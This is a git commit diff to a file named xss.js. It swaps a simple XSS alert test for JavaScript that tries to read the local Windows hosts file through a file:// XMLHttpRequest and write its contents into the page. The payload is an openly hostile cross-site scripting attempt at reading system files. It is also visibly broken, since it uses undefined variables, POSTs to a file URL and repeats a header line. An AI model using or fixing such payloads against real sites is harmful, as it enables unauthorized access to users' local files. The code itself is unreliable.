146056c08c9ef38507090ee406cad99dabf701ea
supakiad <72428471+supakiad@users.noreply.github.com>
2021-06-02 14:39:22 +0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,28 @@
-<script>alert('m3ez');</script>
+var url = "file:///C:/WINDOWS/system32/drivers/etc/hosts";
+ var boundary = "--------------" + (new Date).getTime();
+  xmlHttp.open('POST', url, true);
+  xmlHttp.onreadystatechange = function ()
+  {
+      if (this.readyState != 4)
+        return;
+
+      var result =this.responseText;
+    document.write(result);
+    };
+  xmlHttp.setRequestHeader('Content-Type', 'multipart/form-data; boundary=' + boundary);
+
+var  part ="";
+ part += 'Content-Disposition: form-data; ';
+  part += 'name="' + document.getElementById("filename").name + '" ; ';
+  //alert(document.getElementById("filename").value);
+  part += 'filename="'+ document.getElementById("filename").value +  '";\r\n';
+
+  part += "Content-Type: application/xml";
+  part += "\r\n\r\n"; // marks end of the headers part
+  part += 'filename="'+ document.getElementById("filename").value +  '";\r\n';
+  part+= data;
+   var request = "--" + boundary + "\r\n";
+  request+= part /* + "--" + boundary + "\r\n" */;
+  request+= "--" + boundary + "--" + "\r\n";
+  alert(request); 
+  xmlHttp.send(request);  
